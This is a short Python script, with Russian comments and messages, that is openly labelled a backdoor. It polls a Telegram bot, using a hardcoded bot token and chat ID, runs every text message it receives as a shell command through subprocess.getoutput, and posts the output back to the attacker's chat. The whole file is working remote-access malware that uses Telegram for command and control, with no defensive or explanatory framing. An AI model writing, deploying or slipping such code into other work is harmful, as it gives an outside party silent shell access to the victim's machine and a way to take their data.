import requests
import subprocess
import time

TOKEN = "7812032063:AAHcpDZge7GoAFkgzVXMncdlyXn3eAX2A18"
CHAT_ID = "249127714"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

# Инициализация - сохраняем ID последнего обработанного сообщения
last_update_id = 0

def send_message(text):
    try:
        requests.post(
            f"{BASE_URL}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML"
            },
            timeout=5
        )
    except Exception as e:
        print(f"Ошибка отправки: {e}")

def get_updates():
    try:
        response = requests.get(
            f"{BASE_URL}/getUpdates",
            params={"offset": last_update_id + 1, "timeout": 10},
            timeout=15
        ).json()
        return response.get("result", [])
    except Exception as e:
        print(f"Ошибка получения updates: {e}")
        return []

def main():
    global last_update_id
    
    send_message("🔌 Backdoor активирован!")
    
    while True:
        updates = get_updates()
        
        for update in updates:
            update_id = update["update_id"]
            message = update.get("message", {})
            
            if update_id > last_update_id:
                last_update_id = update_id
                
                if "text" in message:
                    command = message["text"]
                    
                    if command == "exit":
                        send_message("🚫 Отключение...")
                        return
                    
                    try:
                        output = subprocess.getoutput(command)
                        send_message(f"✅ Результат:\n<code>{output}</code>")
                    except Exception as e:
                        send_message(f"❌ Ошибка выполнения: {e}")
        
        time.sleep(1)

if __name__ == "__main__":
    main()
